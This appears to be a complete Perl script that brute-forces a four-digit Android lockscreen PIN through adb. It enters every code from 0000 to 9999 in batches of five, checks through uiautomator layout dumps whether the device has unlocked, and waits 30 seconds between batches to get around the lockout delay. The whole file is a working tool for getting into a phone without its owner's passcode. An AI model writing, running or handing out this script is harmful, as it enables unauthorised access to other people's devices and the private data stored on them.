#!/usr/bin/perl

use File::Temp;
use XML::Simple;
use Data::Dumper;

sub adb
{
	my ($command) = @_;
	my $finalcommand = "adb shell " . $command;
	return qx($finalcommand);
}

sub getfile
{
	my ($infile) = @_;
	my $adbcall = "cat $infile";
	my $data = adb($adbcall);
	return $data;
}

sub trycode
{
    my ($passcode) = @_;
    adb("input text $passcode");
    adb("input keyevent KEYCODE_ENTER");
}

sub isscreenon
{
    # This is for Android 4.2.2 - need to check other versions
    my $status=adb("service call power 9");
    my @results=split(/ /,$status);
    
    return $results[2] + 0;
}

sub islockscreen
{
    # We're assuming that the top package will be android with a class of android.widget.FrameLayout
    adb("uiautomator dump /sdcard/layout.xml");
    my $dumpfile=getfile("/sdcard/layout.xml");
    adb("rm /sdcard/layout.xml");
    
    my $xml=XMLin($dumpfile);
    my $node=$xml->{'node'};
    my $package=$node->{'package'};
    my $class=$node->{'class'};
    
    return ($package eq "android" && $class eq "android.widget.FrameLayout");
}

print "Starting bruteforce\n";
for (my $i=0; $i<10000;$i+=5)
{
    printf "Trying %04d to %04d\n", $i, $i+4;
    
    # First check whether the screen is on and whether the device is locked
    # we do it in this order to minimise the chance to the screen being off when we start
    # bruteforcing
    my $locks=islockscreen();
    if (!isscreenon())
    {
        adb("input keyevent KEYCODE_POWER");
    }
    if (!$locks)
    {
        print "The screen is unlocked, last code is $i\n";
        exit(0);
    }
    # Otherwise
    for (my $j=$i;$j<$i+5;$j++)
    {
        trycode(sprintf("%04d", $j));
        if (!islockscreen())
        {
            print "The screen is unlocked, last code is $j\n";
            exit(0);
        }
    }
    # sleep for 30 seconds
    adb("input keyevent KEYCODE_ENTER");
    sleep(30);
}
